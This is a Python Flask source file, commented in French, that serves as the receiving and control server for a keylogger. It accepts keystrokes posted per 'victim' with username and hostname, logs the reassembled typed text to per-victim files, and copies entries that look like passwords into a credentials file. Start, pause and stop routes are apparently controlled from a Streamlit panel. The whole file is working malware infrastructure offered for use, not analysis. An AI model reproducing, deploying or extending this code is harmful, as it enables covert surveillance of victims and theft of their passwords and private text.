from flask import Flask, request
import os, json
from datetime import datetime

app = Flask(__name__)
BASE = "victims"

CONCAT = {}
CREDENTIALS = {}

# État du keylogger contrôlé depuis Streamlit
LOGGER_STATUS = {"active": True}


def looks_like_password(text):
    if len(text) >= 8 and any(c.isdigit() for c in text) and any(c in "!@#$%&*?-                                                                                                                                  _+=;" for c in text):
        return True
    return False


# -------------------------
#     ROUTES DE CONTROLE
# -------------------------

@app.route("/status", methods=["GET"])
def status():
    return LOGGER_STATUS


@app.route("/start", methods=["POST"])
def start():
    LOGGER_STATUS["active"] = True
    return {"status": "started"}


@app.route("/pause", methods=["POST"])
def pause():
    LOGGER_STATUS["active"] = False
    return {"status": "paused"}


@app.route("/stop", methods=["POST"])
def stop():
    LOGGER_STATUS["active"] = False
    return {"status": "stopped"}


# -------------------------
#        LOG KEYLOGGER
# -------------------------

@app.route("/receive", methods=["POST"])
def receive():
    if not LOGGER_STATUS["active"]:
        return {"status": "disabled"}, 200

    data = request.get_json()
    if data is None:
        return {"status": "error", "msg": "No JSON"}, 400

    victim = data["victim"]
    key = data["key"]
    username = data["username"]
    hostname = data["hostname"]
    timestamp = datetime.now().strftime("%d/%m/%Y %I:%M:%S %p")

    path = f"{BASE}/{victim}"
    os.makedirs(path, exist_ok=True)

    concat_file = f"{path}/concat.json"
    creds_file = f"{path}/credentials.json"
    info_file = f"{path}/info.json"

    # Infos système
    with open(info_file, "w") as f:
        json.dump({"victim": victim, "username": username, "hostname": hostname}                                                                                                                                  , f, indent=4)

    if victim not in CONCAT:
        CONCAT[victim] = ""

    # Gestion des touches
    if key == "<ENTER>":
        final_entry = {"timestamp": timestamp, "text": CONCAT[victim]}
        with open(concat_file, "a") as f:
            json.dump(final_entry, f)
            f.write("\n")

        if looks_like_password(CONCAT[victim]):
            with open(creds_file, "a") as f:
                json.dump(final_entry, f)
                f.write("\n")

        CONCAT[victim] = ""
    elif key == "<BACKSPACE>":
        CONCAT[victim] = CONCAT[victim][:-1]
    else:
        CONCAT[victim] += key
        entry = {"timestamp": timestamp, "text": CONCAT[victim]}
        with open(concat_file, "a") as f:
            json.dump(entry, f)
            f.write("\n")

    return {"status": "received"}, 200


if __name__ == "__main__":
    app.run(host="0.0.0.0", port=5000)
